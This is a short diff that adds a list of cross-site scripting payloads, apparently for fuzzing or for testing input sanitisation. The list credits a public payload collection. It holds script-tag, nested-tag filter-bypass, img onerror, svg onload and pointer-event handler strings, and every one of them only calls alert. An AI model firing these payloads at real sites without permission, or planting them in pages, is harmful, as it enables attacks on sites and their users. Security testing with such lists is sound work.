@@ -1,0 +1,10 @@
+// https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
